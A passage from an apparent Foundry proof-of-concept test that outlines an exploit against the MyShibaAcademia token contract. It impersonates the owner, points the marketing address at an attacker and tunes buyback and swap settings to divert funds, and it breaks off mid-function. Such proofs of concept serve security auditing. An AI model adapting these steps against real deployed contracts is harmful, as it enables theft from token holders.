        address owner = MyShibaAcademia(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Give attacker some initial tokens to work with
        deal(TARGET, attacker, 100_000 * 10**9);

        // Give attacker some ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get owner address
        address owner = MyShibaAcademia(TARGET).owner();

        // Step 2: Give contract some BNB balance first
        // We need to send BNB to the contract
        (bool success, ) = TARGET.call{value: 1 ether}("");
        require(success, "Failed to send BNB to contract");

        // Step 3: Impersonate owner to change critical parameters
        vm.startPrank(owner);

        // Change marketing address to attacker
        MyShibaAcademia(TARGET).setMarketingAddress(attacker);

        // Enable buyback and set parameters to trigger it
        MyShibaAcademia(TARGET).setBuyBackEnabled(true);
        MyShibaAcademia(TARGET).setBuybackUpperLimit(10 * 10**18); // 10 BNB upper limit
        MyShibaAcademia(TARGET).setBuyBackDivisor(1); // 100% of limit

        // Also enable swapAndLiquify
        MyShibaAcademia(TARGET).setSwapAndLiquifyEnabled(true);

        // Set very low minimum tokens before swap
        MyShibaAcademia(TARGET).setNumTokensSellToAddToLiquidity(1);

